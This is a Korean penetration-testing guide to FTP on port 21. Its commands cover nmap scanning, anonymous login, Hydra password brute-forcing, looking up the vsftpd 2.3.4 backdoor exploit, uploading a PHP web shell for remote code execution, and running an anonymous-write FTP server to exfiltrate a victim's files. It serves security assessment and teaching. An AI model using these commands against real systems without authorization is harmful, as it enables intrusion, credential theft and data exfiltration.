---
sidebar_position: 1
title: FTP (Port 21)
---

# FTP (Port 21) 취약점 진단

## Overview

**FTP (File Transfer Protocol)**: 파일 전송 프로토콜. 평문 전송으로 인해 네트워크 스니핑에 매우 취약

**일반적인 FTP 서비스 데몬**:
- vsftpd
- ProFTPD
- Pure-FTPd
- Microsoft IIS FTP

---

## Assessment Checklist

- [ ] **서비스 버전 확인**: 구버전 FTP 서비스(예: vsftpd 2.3.4)의 알려진 취약점(RCE 등) 존재 여부 점검
- [ ] **익명(Anonymous) 로그인 허용 여부**: `anonymous` 계정으로 패스워드 없이 접속 및 파일 열람 가능 여부 점검
- [ ] **디렉토리 및 파일 권한 확인**:
  - 중요 파일(설정 파일, DB 백업, SSH 키 등) 읽기 권한 노출 여부 점검
  - 웹 루트 디렉토리(`/var/www/html` 등) 내 악성 스크립트(웹 쉘) 쓰기 권한 점검
- [ ] **기본/약한 계정 정보**: 서비스 기본 계정명(`admin:admin` 등) 확인 및 무차별 대입 공격(Brute-force) 테스트

---

## 1. Reconnaissance

### 서비스 및 버전 스캔
```bash
# Nmap 포트 스캔 및 버전 정보 수집, 기본 안전 스크립트 실행
nmap -p 21 -sV -sC <target>

# 출력 예시:
# 21/tcp open  ftp     vsftpd 2.3.4
# | ftp-anon: Anonymous FTP login allowed
```

### NSE 스크립트 활용
```bash
# 익명 로그인 허용 여부 신속 진단
nmap -p 21 --script ftp-anon <target>

# 모든 FTP 관련 취약점 및 정보 수집 스크립트 실행
nmap -p 21 --script "ftp-*" <target>

# 로컬 환경 내 FTP 관련 NSE 스크립트 목록 조회
ls -lh /usr/share/nmap/scripts/*ftp*
```

---

## 2. Exploitation

### 익명(Anonymous) 로그인 테스트
```bash
# 1. 기본 FTP 클라이언트로 대상 접속
ftp <target>

# 2. 크리덴셜 입력
Name: anonymous
Password: (아무거나 입력 또는 엔터)

# 230 Login successful 출력 시 익명 로그인 성공
```

### 파일 업로드 및 다운로드 테스트
FTP 세션 연결 성공 시 파일 쓰기 및 읽기 권한 점검
```bash
ftp> binary           # 파일 전송 전 바이너리 모드 전환 (깨짐 방지용, 필수)
ftp> ls -la           # 숨김 파일을 포함한 파일 및 디렉토리 권한 목록 확인
ftp> pwd              # 현재 서버 경로 확인

# 파일 다운로드 (읽기 권한 점검)
ftp> get config.php
ftp> mget *           # 현재 디렉토리 내 다중 파일 일괄 다운로드

# 파일 업로드 (쓰기 권한 점검)
ftp> cd uploads
ftp> put shell.php
```

> [!TIP] **FTP를 활용한 웹 쉘(Web Shell) 공격 시나리오**
> 1. `pwd` 명령으로 현재 경로가 웹 서버 루트 경로(`/var/www/html` 등)인지 파악
> 2. 쓰기 권한 존재 시 `put shell.php` 명령으로 악성 웹 쉘 코드 업로드
> 3. 웹 브라우저로 `http://<target>/uploads/shell.php?cmd=id` 접근을 통해 원격 코드 실행(RCE) 달성

### 브루트포스 (Brute-Force) 공격
익명 로그인이 제한된 경우, Hydra 등의 도구로 크리덴셜 공격 시도
```bash
# Hydra 이용 특정 계정(admin) 패스워드 브루트포스
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>

# 다중 유저/패스워드 워드리스트 조합 공격
hydra -L users.txt -P passwords.txt ftp://<target>

# NetExec (구 CrackMapExec) 이용 인증 기반 원격 파일 목록 조회
netexec ftp <target> -u 'admin' -p 'password123' --ls
```

### 공개 취약점(Public Exploit) 검색
수집된 서비스 이름/버전 기반 기출 시그니처(1-day) 검색
```bash
# Exploit-DB 내장 검색 도구 활용
searchsploit vsftpd 2.3.4
# 출력 예시: vsftpd 2.3.4 - Backdoor Command Execution

# 식별된 익스플로잇 코드(루비 스크립트 등) 내용 확인
searchsploit -x 17491
```

---

## 3. Advanced Techniques

### 방화벽 우회를 위한 Passive Mode
Active Mode는 데이터 전송 시 서버가 클라이언트 측으로 연결을 시도하므로 클라이언트 방화벽 차단 발생 가능. 클라이언트가 주도적으로 연결하는 Passive Mode 전환 필요
```bash
ftp> passive
# Passive mode on.
```

### 커맨드라인 자동화 (스크립팅)
리눅스 터미널에서 스크립트/파이프라인을 통한 백그라운드 자동 파일 다운로드
```bash
cat > ftp_commands.txt << EOF
open <target>
anonymous
anonymous
binary
get secret.txt
bye
EOF

ftp -n < ftp_commands.txt
```

### 간이 파이썬 FTP 서버 구동
피해자(Victim) PC에서 공격자(Attacker) PC로 파일 유출(Exfiltration) 또는 페이로드 전송 시 로컬 FTP 서버 오픈
```bash
# pyftpdlib 모듈 설치
sudo apt-get install python3-pyftpdlib

# 21번 포트에 익명 쓰기 권한(-w) 부여 및 /tmp/share 폴더 FTP 공유
sudo python3 -m pyftpdlib -p 21 -w -d /tmp/share
```

---

## 4. Post-Exploitation
쉘 권한 획득 또는 로컬 파일 포함(LFI) 취약점 발견 시, 하단 경로의 FTP 구성 파일 및 로그 조회를 통한 추가 정보 획득

**설정 파일 위치:**
- `/etc/vsftpd.conf` 또는 `/etc/vsftpd/vsftpd.conf`
- `/etc/proftpd/proftpd.conf`
- `/etc/pure-ftpd/pure-ftpd.conf`

**로그 파일 위치:**
- `/var/log/vsftpd.log`
- `/var/log/proftpd/proftpd.log`
